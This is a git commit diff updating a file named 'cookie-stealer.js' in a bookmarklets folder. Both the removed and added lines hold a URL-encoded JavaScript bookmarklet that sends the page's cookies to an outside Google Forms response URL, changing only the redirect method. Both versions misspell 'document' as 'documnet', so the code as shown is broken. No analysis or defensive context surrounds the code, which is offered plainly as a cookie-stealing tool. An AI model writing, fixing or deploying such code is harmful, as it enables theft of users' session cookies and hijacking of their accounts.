52ecc89d79d4d835b16da053d9ecf0aff8b9ff0d
Gage Atkinson <73555272+someStranger8@users.noreply.github.com>
2022-01-24 09:05:45 -0500

    Update cookie-stealer.js

--- bookmarklets/cookie-stealer.js
+++ bookmarklets/cookie-stealer.js
@@ -1,1 +1,1 @@
-javascript:(function()%7Bdocument.location.href%20%3D%20%22https%3A%2F%2Fdocs.google.com%2Fforms%2Fu%2F0%2Fd%2Fe%2F1FAIpQLSdnzPv2LxLzSHqPHGX81nXPKA81HYBtqYARneO4pOfbN-wZLQ%2FformResponse%3Fentry.725273572%3D%22%20%2B%20documnet.cookie%3B%7D)()%3B
+javascript:(function()%7Bdocument.location.replace(%22https%3A%2F%2Fdocs.google.com%2Fforms%2Fu%2F0%2Fd%2Fe%2F1FAIpQLSdnzPv2LxLzSHqPHGX81nXPKA81HYBtqYARneO4pOfbN-wZLQ%2FformResponse%3Fentry.725273572%3D%22%20%2B%20documnet.cookie)%3B%7D)()%3B
